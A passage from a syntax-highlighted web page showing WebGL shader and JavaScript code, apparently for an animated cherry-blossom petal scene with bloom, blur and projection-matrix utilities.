class="javascript">  varying float palpha;</span></span><br><span class="line"><span class="javascript">  varying float pdist;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="comment">//varying mat3 rotMat;</span></span></span><br><span class="line"><span class="javascript">  varying vec3 normX;</span></span><br><span class="line"><span class="javascript">  varying vec3 normY;</span></span><br><span class="line"><span class="javascript">  varying vec3 normZ;</span></span><br><span class="line"><span class="javascript">  varying vec3 normal;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  varying float diffuse;</span></span><br><span class="line"><span class="javascript">  varying float specular;</span></span><br><span class="line"><span class="javascript">  varying float rstop;</span></span><br><span class="line"><span class="javascript">  varying float distancefade;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  float <span class="function"><span class="title">ellipse</span>(<span class="params">vec2 p, vec2 o, vec2 r</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      vec2 lp = (p - o) / r;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> length(lp) - <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      vec3 p = vec3(gl_PointCoord - vec2(<span class="number">0.5</span>, <span class="number">0.5</span>), <span class="number">0.0</span>) * <span class="number">2.0</span>;</span></span><br><span class="line"><span class="javascript">      vec3 d = vec3(<span class="number">0.0</span>, <span class="number">0.0</span>, -<span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">      float nd = normZ.z; <span class="comment">//dot(-normZ, d);</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span>(abs(nd) &lt; <span class="number">0.0001</span>) discard;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      float np = dot(normZ, p);</span></span><br><span class="line"><span class="javascript">      vec3 tp = p + d * np / nd;</span></span><br><span class="line"><span class="javascript">      vec2 coord = vec2(dot(normX, tp), dot(normY, tp));</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="comment">//angle = 15 degree</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> float flwrsn = <span class="number">0.258819045102521</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> float flwrcs = <span class="number">0.965925826289068</span>;</span></span><br><span class="line"><span class="javascript">      mat2 flwrm = mat2(flwrcs, -flwrsn, flwrsn, flwrcs);</span></span><br><span class="line"><span class="javascript">      vec2 flwrp = vec2(abs(coord.x), coord.y) * flwrm;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      float r;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span>(flwrp.x &lt; <span class="number">0.0</span>) &#123;</span></span><br><span class="line"><span class="javascript">          r = ellipse(flwrp, vec2(<span class="number">0.065</span>, <span class="number">0.024</span>) * <span class="number">0.5</span>, vec2(<span class="number">0.36</span>, <span class="number">0.96</span>) * <span class="number">0.5</span>);</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">          r = ellipse(flwrp, vec2(<span class="number">0.065</span>, <span class="number">0.024</span>) * <span class="number">0.5</span>, vec2(<span class="number">0.58</span>, <span class="number">0.96</span>) * <span class="number">0.5</span>);</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span>(r &gt; rstop) discard;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      vec3 col = mix(vec3(<span class="number">1.0</span>, <span class="number">0.8</span>, <span class="number">0.75</span>), vec3(<span class="number">1.0</span>, <span class="number">0.9</span>, <span class="number">0.87</span>), r);</span></span><br><span class="line"><span class="javascript">      float grady = mix(<span class="number">0.0</span>, <span class="number">1.0</span>, pow(coord.y * <span class="number">0.5</span> + <span class="number">0.5</span>, <span class="number">0.35</span>));</span></span><br><span class="line"><span class="javascript">      col *= vec3(<span class="number">1.0</span>, grady, grady);</span></span><br><span class="line"><span class="javascript">      col *= mix(<span class="number">0.8</span>, <span class="number">1.0</span>, pow(abs(coord.x), <span class="number">0.3</span>));</span></span><br><span class="line"><span class="javascript">      col = col * diffuse + specular;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      col = mix(fadeCol, col, distancefade);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      float alpha = (rstop &gt; <span class="number">0.001</span>)? (<span class="number">0.5</span> - r / (rstop * <span class="number">2.0</span>)) : <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">      alpha = smoothstep(<span class="number">0.0</span>, <span class="number">1.0</span>, alpha) * palpha;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      gl_FragColor = vec4(col * <span class="number">0.5</span>, alpha);</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- effects --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;fx_common_vsh&quot;</span> <span class="attr">type</span>=<span class="string">&quot;x-shader/x_vertex&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  uniform vec3 uResolution;</span></span><br><span class="line"><span class="javascript">  attribute vec2 aPosition;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  varying vec2 texCoord;</span></span><br><span class="line"><span class="javascript">  varying vec2 screenCoord;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      gl_Position = vec4(aPosition, <span class="number">0.0</span>, <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">      texCoord = aPosition.xy * <span class="number">0.5</span> + vec2(<span class="number">0.5</span>, <span class="number">0.5</span>);</span></span><br><span class="line"><span class="javascript">      screenCoord = aPosition.xy * vec2(uResolution.z, <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;bg_fsh&quot;</span> <span class="attr">type</span>=<span class="string">&quot;x-shader/x_fragment&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  #ifdef GL_ES</span></span><br><span class="line"><span class="javascript">  <span class="comment">//precision mediump float;</span></span></span><br><span class="line"><span class="javascript">  precision highp float;</span></span><br><span class="line"><span class="javascript">  #endif</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  uniform vec2 uTimes;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  varying vec2 texCoord;</span></span><br><span class="line"><span class="javascript">  varying vec2 screenCoord;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      vec3 col;</span></span><br><span class="line"><span class="javascript">      float c;</span></span><br><span class="line"><span class="javascript">      vec2 tmpv = texCoord * vec2(<span class="number">0.8</span>, <span class="number">1.0</span>) - vec2(<span class="number">0.95</span>, <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">      c = exp(-pow(length(tmpv) * <span class="number">1.8</span>, <span class="number">2.0</span>));</span></span><br><span class="line"><span class="javascript">      col = mix(vec3(<span class="number">0.02</span>, <span class="number">0.0</span>, <span class="number">0.03</span>), vec3(<span class="number">0.96</span>, <span class="number">0.98</span>, <span class="number">1.0</span>) * <span class="number">1.5</span>, c);</span></span><br><span class="line"><span class="javascript">      gl_FragColor = vec4(col * <span class="number">0.5</span>, <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;fx_brightbuf_fsh&quot;</span> <span class="attr">type</span>=<span class="string">&quot;x-shader/x_fragment&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  #ifdef GL_ES</span></span><br><span class="line"><span class="javascript">  <span class="comment">//precision mediump float;</span></span></span><br><span class="line"><span class="javascript">  precision highp float;</span></span><br><span class="line"><span class="javascript">  #endif</span></span><br><span class="line"><span class="javascript">  uniform sampler2D uSrc;</span></span><br><span class="line"><span class="javascript">  uniform vec2 uDelta;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  varying vec2 texCoord;</span></span><br><span class="line"><span class="javascript">  varying vec2 screenCoord;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      vec4 col = texture2D(uSrc, texCoord);</span></span><br><span class="line"><span class="javascript">      gl_FragColor = vec4(col.rgb * <span class="number">2.0</span> - vec3(<span class="number">0.5</span>), <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;fx_dirblur_r4_fsh&quot;</span> <span class="attr">type</span>=<span class="string">&quot;x-shader/x_fragment&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  #ifdef GL_ES</span></span><br><span class="line"><span class="javascript">  <span class="comment">//precision mediump float;</span></span></span><br><span class="line"><span class="javascript">  precision highp float;</span></span><br><span class="line"><span class="javascript">  #endif</span></span><br><span class="line"><span class="javascript">  uniform sampler2D uSrc;</span></span><br><span class="line"><span class="javascript">  uniform vec2 uDelta;</span></span><br><span class="line"><span class="javascript">  uniform vec4 uBlurDir; <span class="comment">//dir(x, y), stride(z, w)</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  varying vec2 texCoord;</span></span><br><span class="line"><span class="javascript">  varying vec2 screenCoord;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      vec4 col = texture2D(uSrc, texCoord);</span></span><br><span class="line"><span class="javascript">      col = col + texture2D(uSrc, texCoord + uBlurDir.xy * uDelta);</span></span><br><span class="line"><span class="javascript">      col = col + texture2D(uSrc, texCoord - uBlurDir.xy * uDelta);</span></span><br><span class="line"><span class="javascript">      col = col + texture2D(uSrc, texCoord + (uBlurDir.xy + uBlurDir.zw) * uDelta);</span></span><br><span class="line"><span class="javascript">      col = col + texture2D(uSrc, texCoord - (uBlurDir.xy + uBlurDir.zw) * uDelta);</span></span><br><span class="line"><span class="javascript">      gl_FragColor = col / <span class="number">5.0</span>;</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- effect fragment shader template --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;fx_common_fsh&quot;</span> <span class="attr">type</span>=<span class="string">&quot;x-shader/x_fragment&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  #ifdef GL_ES</span></span><br><span class="line"><span class="javascript">  <span class="comment">//precision mediump float;</span></span></span><br><span class="line"><span class="javascript">  precision highp float;</span></span><br><span class="line"><span class="javascript">  #endif</span></span><br><span class="line"><span class="javascript">  uniform sampler2D uSrc;</span></span><br><span class="line"><span class="javascript">  uniform vec2 uDelta;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  varying vec2 texCoord;</span></span><br><span class="line"><span class="javascript">  varying vec2 screenCoord;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      gl_FragColor = texture2D(uSrc, texCoord);</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- post processing --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;pp_final_vsh&quot;</span> <span class="attr">type</span>=<span class="string">&quot;x-shader/x_vertex&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  uniform vec3 uResolution;</span></span><br><span class="line"><span class="javascript">  attribute vec2 aPosition;</span></span><br><span class="line"><span class="javascript">  varying vec2 texCoord;</span></span><br><span class="line"><span class="javascript">  varying vec2 screenCoord;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      gl_Position = vec4(aPosition, <span class="number">0.0</span>, <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">      texCoord = aPosition.xy * <span class="number">0.5</span> + vec2(<span class="number">0.5</span>, <span class="number">0.5</span>);</span></span><br><span class="line"><span class="javascript">      screenCoord = aPosition.xy * vec2(uResolution.z, <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;pp_final_fsh&quot;</span> <span class="attr">type</span>=<span class="string">&quot;x-shader/x_fragment&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  #ifdef GL_ES</span></span><br><span class="line"><span class="javascript">  <span class="comment">//precision mediump float;</span></span></span><br><span class="line"><span class="javascript">  precision highp float;</span></span><br><span class="line"><span class="javascript">  #endif</span></span><br><span class="line"><span class="javascript">  uniform sampler2D uSrc;</span></span><br><span class="line"><span class="javascript">  uniform sampler2D uBloom;</span></span><br><span class="line"><span class="javascript">  uniform vec2 uDelta;</span></span><br><span class="line"><span class="javascript">  varying vec2 texCoord;</span></span><br><span class="line"><span class="javascript">  varying vec2 screenCoord;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">void</span> <span class="function"><span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      vec4 srccol = texture2D(uSrc, texCoord) * <span class="number">2.0</span>;</span></span><br><span class="line"><span class="javascript">      vec4 bloomcol = texture2D(uBloom, texCoord);</span></span><br><span class="line"><span class="javascript">      vec4 col;</span></span><br><span class="line"><span class="javascript">      col = srccol + bloomcol * (vec4(<span class="number">1.0</span>) + srccol);</span></span><br><span class="line"><span class="javascript">      col *= smoothstep(<span class="number">1.0</span>, <span class="number">0.0</span>, pow(length((texCoord - vec2(<span class="number">0.5</span>)) * <span class="number">2.0</span>), <span class="number">1.2</span>) * <span class="number">0.5</span>);</span></span><br><span class="line"><span class="javascript">      col = pow(col, vec4(<span class="number">0.45454545454545</span>)); <span class="comment">//(1.0 / 2.2)</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      gl_FragColor = vec4(col.rgb, <span class="number">1.0</span>);</span></span><br><span class="line"><span class="javascript">      gl_FragColor.a = <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- partial --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// Utilities</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> Vector3 = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> Matrix44 = &#123;&#125;;</span></span><br><span class="line"><span class="javascript">    Vector3.create = <span class="function"><span class="keyword">function</span>(<span class="params">x, y, z</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> &#123;<span class="string">&#x27;x&#x27;</span>:x, <span class="string">&#x27;y&#x27;</span>:y, <span class="string">&#x27;z&#x27;</span>:z&#125;;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    Vector3.dot = <span class="function"><span class="keyword">function</span> (<span class="params">v0, v1</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> v0.x * v1.x + v0.y * v1.y + v0.z * v1.z;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    Vector3.cross = <span class="function"><span class="keyword">function</span> (<span class="params">v, v0, v1</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        v.x = v0.y * v1.z - v0.z * v1.y;</span></span><br><span class="line"><span class="javascript">        v.y = v0.z * v1.x - v0.x * v1.z;</span></span><br><span class="line"><span class="javascript">        v.z = v0.x * v1.y - v0.y * v1.x;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    Vector3.normalize = <span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> l = v.x * v.x + v.y * v.y + v.z * v.z;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(l &gt; <span class="number">0.00001</span>) &#123;</span></span><br><span class="line"><span class="javascript">            l = <span class="number">1.0</span> / <span class="built_in">Math</span>.sqrt(l);</span></span><br><span class="line"><span class="javascript">            v.x *= l;</span></span><br><span class="line"><span class="javascript">            v.y *= l;</span></span><br><span class="line"><span class="javascript">            v.z *= l;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    Vector3.arrayForm = <span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(v.array) &#123;</span></span><br><span class="line"><span class="javascript">            v.array[<span class="number">0</span>] = v.x;</span></span><br><span class="line"><span class="javascript">            v.array[<span class="number">1</span>] = v.y;</span></span><br><span class="line"><span class="javascript">            v.array[<span class="number">2</span>] = v.z;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            v.array = <span class="keyword">new</span> <span class="built_in">Float32Array</span>([v.x, v.y, v.z]);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> v.array;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    Matrix44.createIdentity = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Float32Array</span>([<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.0</span>]);</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    Matrix44.loadProjection = <span class="function"><span class="keyword">function</span> (<span class="params">m, aspect, vdeg, near, far</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> h = near * <span class="built_in">Math</span>.tan(vdeg * <span class="built_in">Math</span>.PI / <span class="number">180.0</span> * <span class="number">0.5</span>) * <span class="number">2.0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> w = h * aspect;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        m[<span class="number">0</span>] = <span class="number">2.0</span> * near / w;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">1</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">2</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">3</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        m[<span class="number">4</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">5</span>] = <span class="number">2.0</span> * near / h;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">6</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">7</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        m[<span class="number">8</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">9</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">10</span>] = -(far + near) / (far - near);</span></span><br><span class="line"><span class="javascript">        m[<span class="number">11</span>] = -<span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        m[<span class="number">12</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">13</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">14</span>] = -<span class="number">2.0</span> * far * near / (far - near);</span></span><br><span class="line"><span class="javascript">        m[<span class="number">15</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    Matrix44.loadLookAt = <span class="function"><span class="keyword">function</span> (<span class="params">m, vpos, vlook, vup</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> frontv = Vector3.create(vpos.x - vlook.x, vpos.y - vlook.y, vpos.z - vlook.z);</span></span><br><span class="line"><span class="javascript">        Vector3.normalize(frontv);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> sidev = Vector3.create(<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span></span><br><span class="line"><span class="javascript">        Vector3.cross(sidev, vup, frontv);</span></span><br><span class="line"><span class="javascript">        Vector3.normalize(sidev);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> topv = Vector3.create(<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span></span><br><span class="line"><span class="javascript">        Vector3.cross(topv, frontv, sidev);</span></span><br><span class="line"><span class="javascript">        Vector3.normalize(topv);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        m[<span class="number">0</span>] = sidev.x;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">1</span>] = topv.x;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">2</span>] = frontv.x;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">3</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        m[<span class="number">4</span>] = sidev.y;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">5</span>] = topv.y;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">6</span>] = frontv.y;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">7</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        m[<span class="number">8</span>] = sidev.z;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">9</span>] = topv.z;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">10</span>] = frontv.z;</span></span><br><span class="line"><span class="javascript">        m[<span class="number">11</span>] = <span class="number">0.0</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        m[<span class="number">12</span>] = -(vpos.x * m[<span class="number">0</span>] + vpos.y * m[<span class="number">4</span>] + vpos.z * m[<span class="number">8</span>]);</span></span><br><span class="line"><span class="javascript">        m[<span class="number">13</span>] = -(vpos.x * m[<span class="number">1</span>] + vpos.y * m[<span class="number">5</span>] + vpos.z * m[<span class="number">9</span>]);</span></span><br><span class="line"><span class="javascript">        m[<span class="number">14</span>] = -(vpos.x * m[<span class="number">2</span>] + vpos.y * m[<span class="number">6</span>] + vpos.z * m[<span class="number">10</span>]);</span></span><br><span class="line"><span class="javascript">        m[<span class="number">15</span>] = <span class="number">1.0</span>;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> timeInfo = &#123;</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;start&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;prev&#x27;</span>:<span class="number">0</span>, <span class="comment">// Date</span></span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;delta&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;elapsed&#x27;</span>:<span class="number">0</span> <span class="comment">// Number(sec)</span></span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> gl;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> renderSpec = &#123;</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;width&#x27;</span>:<span class="number">0</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;height&#x27;</span>:<span class="number">0</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;aspect&#x27;</span>:<span class="number">1</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;array&#x27;</span>:<span class="keyword">new</span> <span class="built_in">Float32Array</span>(<span class="number">3</span>),</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;halfWidth&#x27;</span>:<span class="number">0</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;halfHeight&#x27;</span>:<span class="number">0</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">&#x27;halfArray&#x27;</span>:<span class="keyword">new</span> <span class="built_in">Float32Array</span>(<span class="number">3</span>)</span></span><br><span class="line"><span class="javascript">        <span class="comment">// and some render targets. see setViewport()</span></span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    renderSpec.setSize = <span class="function"><span class="keyword">function</span>(<span class="params">w, h</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        renderSpec.width = w;</span></span><br><span class="line"><span class="javascript">        renderSpec.height = h;</span></span><br><span class="line"><span class="javascript">        renderSpec.aspect = renderSpec.width / renderSpec.height;</span></span><br><span class="line"><span class="javascript">        renderSpec.array[<span class="number">0</span>] = renderSpec.width;</span></span><br><span class="line"><span class="javascript">        renderSpec.array[<span class="number">1</span>] = renderSpec.height;</span></span><br><span class="line"><span class="javascript">        renderSpec.array[<span class="number">2</span>] = renderSpec.aspect;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        renderSpec.halfWidth = <span class="built_in">Math</span>.floor(w / <span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">        renderSpec.halfHeight = <span class="built_in">Math</span>.floor(h / <span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">        renderSpec.halfArray[<span class="number">0</span>] = renderSpec.halfWidth;</span></span><br><span class="line"><span class="javascript">        renderSpec.halfArray[<span class="number">1</span>] = renderSpec.halfHeight;</span></span><br><span class="line"><span class="javascript">        renderSpec.halfArray[<span class="number">2</span>] = renderSpec.halfWidth / renderSpec.halfHeight;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">deleteRenderTarget</span>(<span class="params">rt</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        gl.deleteFramebuffer(rt.frameBuffer);</span></span><br><span class="line"><span class="javascript">        gl.deleteRenderbuffer(rt.renderBuffer);</span></span><br><span class="line"><span class="javascript">        gl.deleteTexture(rt.texture);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">createRenderTarget</span>(<span class="params">w, h</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ret = &#123;</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;width&#x27;</span>:w,</span></span><br><span 